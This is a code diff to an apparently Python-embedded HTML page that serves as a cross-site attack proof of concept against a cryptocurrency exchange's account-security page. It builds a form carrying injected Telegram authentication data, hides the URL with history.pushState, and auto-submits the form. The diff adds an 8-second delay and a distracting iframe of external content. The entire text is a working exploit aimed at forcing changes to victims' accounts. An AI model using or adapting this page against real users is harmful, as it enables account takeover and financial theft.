@@ -13,7 +13,7 @@ PAGE = """
 <!doctype html>
 <html>
   <body>
-    
+    <iframe src="/static/imran.html" width="600" height="400" title="Contenu externe"></iframe>
     <form action="https://www.toobit.com/en-US/user/security#tgAuthResult=eyJpZCI6ODI1MDU4MDUwMiwiZmlyc3RfbmFtZSI6IlBvbGljZSIsImF1dGhfZGF0ZSI6MTc4NDExNTkyNCwiaGFzaCI6IjQxNjIwZjdhODZmMjFlNTIzNTU5N2RlNjNmZTU4NGM1ZjNmYjk1MDRmODVjYzYxODdjMGFlOGZjOGZhNWUyYTAifQ">
      
     </form>
@@ -22,7 +22,7 @@ PAGE = """
       history.pushState('', '', '/');
       setTimeout(function() {
         document.forms[0].submit();
-      });
+      }, 8000);
     </script>
   </body>
 </html>
